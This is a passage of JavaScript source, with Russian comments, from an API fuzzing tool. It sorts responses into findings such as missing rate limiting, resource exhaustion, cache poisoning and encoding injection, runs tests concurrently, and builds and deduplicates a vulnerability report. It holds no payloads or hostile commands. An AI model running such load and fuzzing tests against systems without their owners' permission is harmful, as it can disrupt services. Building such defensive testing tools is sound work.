        this._leakCounters[leakKey].reported = true;
        vulns.push({ 
          type: 'Potential Data Leak', 
          severity: 'high',
          endpoint: testCase.path,
          method: testCase.method,
          payload: testCase.payload,
          response_status: status,
          snippet: resp.substring(0, 200)
        });
      }
    }
    
    // ==================== НОВЫЕ ТИПЫ ТЕСТОВ ====================
    
    // Rate limiting rapid - группируем по эндпоинту и методу
    if (testCase.type === 'rate_limit_rapid') {
        const rapidKey = `${testCase.path}_${testCase.method}_rapid`;
        
        if (!this._rateLimitCounters[rapidKey]) {
            this._rateLimitCounters[rapidKey] = { 
                success: 0, 
                total: 0, 
                statuses: [],
                endpoint: testCase.path,
                method: testCase.method
            };
        }
        
        this._rateLimitCounters[rapidKey].total++;
        this._rateLimitCounters[rapidKey].statuses.push(status);
        if (status === 200) {
            this._rateLimitCounters[rapidKey].success++;
        }
        
        if (this._rateLimitCounters[rapidKey].total === 10) {
            const successCount = this._rateLimitCounters[rapidKey].success;
            if (successCount >= 8) {
                vulns.push({ 
                    type: 'Missing Rate Limiting', 
                    severity: 'medium',
                    endpoint: this._rateLimitCounters[rapidKey].endpoint,
                    method: this._rateLimitCounters[rapidKey].method,
                    payload: `${successCount} successful requests out of 10 rapid requests`,
                    response_status: status,
                    snippet: `API successfully handled ${successCount} out of 10 rapid sequential requests without rate limiting`
                });
            }
            delete this._rateLimitCounters[rapidKey];
        }
    }
    
    // Rate limiting ramp - группируем по эндпоинту и методу
    if (testCase.type === 'rate_limit_ramp') {
        const rampKey = `${testCase.path}_${testCase.method}_ramp`;
        
        if (!this._rateLimitRampCounters[rampKey]) {
            this._rateLimitRampCounters[rampKey] = { 
                delays: [], 
                successes: [], 
                statuses: [],
                endpoint: testCase.path,
                method: testCase.method
            };
        }
        
        this._rateLimitRampCounters[rampKey].delays.push(testCase.delay);
        this._rateLimitRampCounters[rampKey].successes.push(status === 200);
        this._rateLimitRampCounters[rampKey].statuses.push(status);
        
        if (this._rateLimitRampCounters[rampKey].delays.length === 8) {
            const allSuccess = this._rateLimitRampCounters[rampKey].successes.every(s => s === true);
            if (allSuccess) {
                vulns.push({ 
                    type: 'No Rate Limiting at Any Load', 
                    severity: 'high',
                    endpoint: this._rateLimitRampCounters[rampKey].endpoint,
                    method: this._rateLimitRampCounters[rampKey].method,
                    payload: `All 8 load levels processed successfully`,
                    response_status: status,
                    snippet: 'API shows no signs of rate limiting even under increasing load'
                });
            }
            delete this._rateLimitRampCounters[rampKey];
        }
    }
    
    // Resource exhaustion - группируем по эндпоинту, методу и типу ресурса
    if (testCase.type === 'resource_exhaustion' && status === 500) {
        const resourceKey = `${testCase.path}_${testCase.method}_${testCase.resourceType}`;
        
        if (!this._resourceCounters[resourceKey]) {
            this._resourceCounters[resourceKey] = {
                reported: false,
                endpoint: testCase.path,
                method: testCase.method,
                resourceType: testCase.resourceType
            };
        }
        
        if (!this._resourceCounters[resourceKey].reported) {
            this._resourceCounters[resourceKey].reported = true;
            vulns.push({ 
                type: 'Resource Exhaustion', 
                severity: 'high',
                endpoint: testCase.path,
                method: testCase.method,
                payload: testCase.body,
                response_status: status,
                snippet: `Server crashed on ${testCase.resourceType}: ${resp.substring(0, 200)}`
            });
        }
    }
    
    // Protocol violations - группируем по эндпоинту, методу и типу нарушения
    if (testCase.type === 'protocol_violation' && status !== 400 && status !== 405 && status !== 415) {
        const protocolKey = `${testCase.path}_${testCase.method}_${testCase.violation}`;
        
        if (!this._protocolCounters[protocolKey]) {
            this._protocolCounters[protocolKey] = {
                reported: false,
                endpoint: testCase.path,
                method: testCase.method,
                violation: testCase.violation
            };
        }
        
        if (!this._protocolCounters[protocolKey].reported) {
            this._protocolCounters[protocolKey].reported = true;
            vulns.push({ 
                type: 'Protocol Violation Accepted', 
                severity: 'medium',
                endpoint: testCase.path,
                method: testCase.method,
                payload: { violation: testCase.violation },
                response_status: status,
                snippet: `Server accepted ${testCase.violation} violation, expected 4xx, got ${status}`
            });
        }
    }
    
    // Boundary vulnerabilities - группируем по эндпоинту, методу и параметру
    if (testCase.type === 'boundary' && status === 200) {
        const boundaryKey = `${testCase.path}_${testCase.method}_${testCase.paramName}`;
        
        if (!this._boundaryCounters[boundaryKey]) {
            this._boundaryCounters[boundaryKey] = {
                reported: false,
                endpoint: testCase.path,
                method: testCase.method,
                paramName: testCase.paramName,
                values: []
            };
        }
        
        this._boundaryCounters[boundaryKey].values.push(testCase.boundaryValue);
        
        if (!this._boundaryCounters[boundaryKey].reported) {
            this._boundaryCounters[boundaryKey].reported = true;
            vulns.push({ 
                type: 'Boundary Value Accepted', 
                severity: 'low',
                endpoint: testCase.path,
                method: testCase.method,
                payload: { [testCase.paramName]: testCase.boundaryValue },
                response_status: status,
                snippet: `Parameter ${testCase.paramName} accepted boundary value`
            });
        }
    }
    
    // Cache poisoning - группируем по эндпоинту и методу
    if (testCase.type === 'cache_poisoning' && status === 200) {
        const cacheKey = `${testCase.path}_${testCase.method}`;
        
        if (!this._cacheCounters[cacheKey]) {
            this._cacheCounters[cacheKey] = {
                reported: false,
                endpoint: testCase.path,
                method: testCase.method,
                tests: []
            };
        }
        
        this._cacheCounters[cacheKey].tests.push(testCase.cacheTest);
        
        if (!this._cacheCounters[cacheKey].reported) {
            this._cacheCounters[cacheKey].reported = true;
            vulns.push({ 
                type: 'Potential Cache Poisoning', 
                severity: 'medium',
                endpoint: testCase.path,
                method: testCase.method,
                payload: { headers: testCase.headers },
                response_status: status,
                snippet: `Cache test ${testCase.cacheTest} succeeded with status ${status}`
            });
        }
    }
    
    // Timeout vulnerabilities - группируем по эндпоинту и методу
    if (testCase.type === 'timeout' && status === 200 && testCase.customTimeout && testCase.customTimeout < 100) {
        const timeoutKey = `${testCase.path}_${testCase.method}`;
        
        if (!this._timeoutCounters[timeoutKey]) {
            this._timeoutCounters[timeoutKey] = {
                reported: false,
                endpoint: testCase.path,
                method: testCase.method,
                timeouts: []
            };
        }
        
        this._timeoutCounters[timeoutKey].timeouts.push(testCase.customTimeout);
        
        if (!this._timeoutCounters[timeoutKey].reported) {
            this._timeoutCounters[timeoutKey].reported = true;
            vulns.push({ 
                type: 'Slow API Response with Short Timeout', 
                severity: 'low',
                endpoint: testCase.path,
                method: testCase.method,
                payload: `Timeout: ${testCase.customTimeout}ms`,
                response_status: status,
                snippet: `API responded with very short timeout, may be vulnerable to Slowloris attacks`
            });
        }
    }
    
    // Encoding vulnerabilities - группируем по эндпоинту, методу и параметру
    if (testCase.type === 'encoding' && status === 200) {
        const encodingKey = `${testCase.path}_${testCase.method}_${testCase.paramName}`;
        
        if (!this._encodingCounters[encodingKey]) {
            this._encodingCounters[encodingKey] = {
                reported: false,
                endpoint: testCase.path,
                method: testCase.method,
                paramName: testCase.paramName,
                encodings: []
            };
        }
        
        this._encodingCounters[encodingKey].encodings.push(testCase.encoding);
        
        if (!this._encodingCounters[encodingKey].reported) {
            this._encodingCounters[encodingKey].reported = true;
            vulns.push({ 
                type: 'Encoding Injection Success', 
                severity: 'medium',
                endpoint: testCase.path,
                method: testCase.method,
                payload: { [testCase.paramName]: testCase.encoding },
                response_status: status,
                snippet: `Encoding ${testCase.encoding} was accepted by parameter ${testCase.paramName}`
            });
        }
    }

    return vulns;
}
  async run() {
    this._rateLimitCounters = {};
    this._rateLimitRampCounters = {};
    this._concurrencyCounters = {};
    this._resourceCounters = {};
    this._protocolCounters = {};
    this._boundaryCounters = {};
    this._cacheCounters = {};
    this._timeoutCounters = {};
    this._encodingCounters = {};
    
    this.startTime = Date.now();
    this.results = [];
    await this.loadSpec();
    this.generateTestCases();

    const concurrencyLimit = Math.min(this.concurrency, this.testCases.length);
    let currentIndex = 0;
    
    const runNext = async () => {
      while (currentIndex < this.testCases.length) {
        const index = currentIndex++;
        const tc = this.testCases[index];
        try {
          const res = await this.executeWithRetry(tc);
          this.results.push(res);
          //logger.debug(`Completed ${tc.id} (${currentIndex}/${this.testCases.length})`);
        } catch (error) {
          logger.error(`Failed ${tc.id}: ${error.message}`);
          this.results.push({
            ...tc,
            status: 0,
            error: error.message,
            success: false,
            timestamp: new Date().toISOString()
          });
        }
      }
    };

    const workers = Array(concurrencyLimit).fill().map(() => runNext());
    await Promise.all(workers);

    return this.getReport();
  }

  getReport() {
    const byEndpoint = {};
    const allVulnerabilities = [];
    const failedTests = [];

    for (const r of this.results) {
      // Инициализация эндпоинта
      if (!byEndpoint[r.path]) {
        byEndpoint[r.path] = { 
          total: 0, 
          vulnerabilities: 0, 
          methods: {},
          tests: []
        };
      }

      byEndpoint[r.path].total++;
      byEndpoint[r.path].tests.push(r);
      
      const vulnsCount = r.vulnerabilities?.length || 0;
      byEndpoint[r.path].vulnerabilities += vulnsCount;

      if (!byEndpoint[r.path].methods[r.method]) {
        byEndpoint[r.path].methods[r.method] = { total: 0, vulnerabilities: 0 };
      }
      byEndpoint[r.path].methods[r.method].total++;
      byEndpoint[r.path].methods[r.method].vulnerabilities += vulnsCount;

      // Собираем проваленные тесты
      if (!r.success) {
        failedTests.push({
          endpoint: r.path,
          method: r.method,
          type: r.type,
          status: r.status,
          error: r.error,
          duration: r.duration,
          payload: r.payload,
          response: r.responseData,
          timestamp: r.timestamp
        });
      }

      // Собираем подробности уязвимостей
      if (r.vulnerabilities?.length) {
        for (const v of r.vulnerabilities) {
          allVulnerabilities.push({
            endpoint: r.path,
            method: r.method,
            type: v.type,
            severity: v.severity,
            payload: v.payload,
            response_status: v.response_status,
            snippet: v.snippet,
            timestamp: r.timestamp
          });
        }
      }
    }

    // ========== ДЕДУПЛИКАЦИЯ УЯЗВИМОСТЕЙ ==========
    const uniqueVulnerabilities = this.deduplicateVulnerabilities(allVulnerabilities);
    
    // ========== ДЕДУПЛИКАЦИЯ ПРОВАЛЕННЫХ ТЕСТОВ ==========
    const uniqueFailedTests = this.deduplicateFailedTests(failedTests);

    return {
      success: true,
      message: 'Фаззинг тестирование завершено',
      summary: {
        total: this.results.length,
        success: this.results.filter(r => r.success).length,
        failed: this.results.filter(r => !r.success).length,
        duration: (Date.now() - this.startTime) / 1000,
        concurrency: this.concurrency,
        timeout: this.timeout,
        endpoints_tested: Object.keys(byEndpoint).length,
        // Добавляем статистику по дубликатам
        duplicates_removed: {
          vulnerabilities: allVulnerabilities.length - uniqueVulnerabilities.length,
          failed_tests: failedTests.length - uniqueFailedTests.length
        }
      },
      byEndpoint,
      vulnerabilities: uniqueVulnerabilities, // Возвращаем уникальные уязвимости
      failedTests: uniqueFailedTests, // Возвращаем уникальные проваленные тесты
      timestamp: new Date().toISOString(),
      spec: {
        title: this.spec.info?.title || 'Unknown',
        version: this.spec.info?.version || 'Unknown',
        endpoints: Object.keys(this.spec.paths || {}).length
      }
    };
  }

  // Метод для дедупликации уязвимостей
  deduplicateVulnerabilities(vulnerabilities) {
    const uniqueMap = new Map();
    
    for (const vuln of vulnerabilities) {
      // Создаем уникальный ключ: эндпоинт + метод + тип + severity
      const key = `${vuln.endpoint}_${vuln.method}_${vuln.type}_${vuln.severity}`;
      
      if (!uniqueMap.has(key)) {
        // Добавляем с счетчиком 1
        uniqueMap.set(key, {
          ...vuln,
          count: 1,
          first_seen: vuln.timestamp,
          last_seen: vuln.timestamp
        });
      } else {
        // Увеличиваем счетчик
        const existing = uniqueMap.get(key);
        existing.count++;
        existing.last_seen = vuln.timestamp;
        
        // Объединяем snippet если нужно (берем первый или самый информативный)
        if (vuln.snippet && !existing.snippet) {
          existing.snippet = vuln.snippet;
        }
        
        // Обновляем статус если есть более новый
        if (vuln.response_status && !existing.response_status) {
          existing.response_status = vuln.response_status;
        }
      }
    }
    
    // Преобразуем Map в массив и добавляем информацию о дубликатах
    return Array.from(uniqueMap.values()).map(vuln => ({
      ...vuln,
      duplicate_count: vuln.count - 1, // Количество дубликатов
      is_duplicate_group: vuln.count > 1
    }));
  }

  // Метод для дедупликации проваленных тестов
  deduplicateFailedTests(failedTests) {
    const uniqueMap = new Map();
    
    for (const test of failedTests) {
      // Ключ: эндпоинт + метод + тип + статус + ошибка
      const key = `${test.endpoint}_${test.method}_${test.type}_${test.status}_${test.error || 'no_error'}`;
      
      if (!uniqueMap.has(key)) {
        uniqueMap.set(key, {
          ...test,
          count: 1
        });
      } else {
        const existing = uniqueMap.get(key);
        existing.count++;
      }
    }
    
    return Array.from(uniqueMap.values()).map(test => ({
      ...test,
      duplicate_count: test.count - 1
    }));
  }

  saveReport(file) {
    const report = this.getReport();
    const ext = path.extname(file).toLowerCase();
    if (ext === '.yaml' || ext === '.yml') {
      fs.writeFileSync(file, yaml.dump(report, { indent: 2, lineWidth: -1, noRefs: true }), 'utf8');
    } else {
      fs.writeFileSync(file, JSON.stringify(report, null, 2), 'utf8');
    }
    return report;
  }
}

export default APIFuzzer;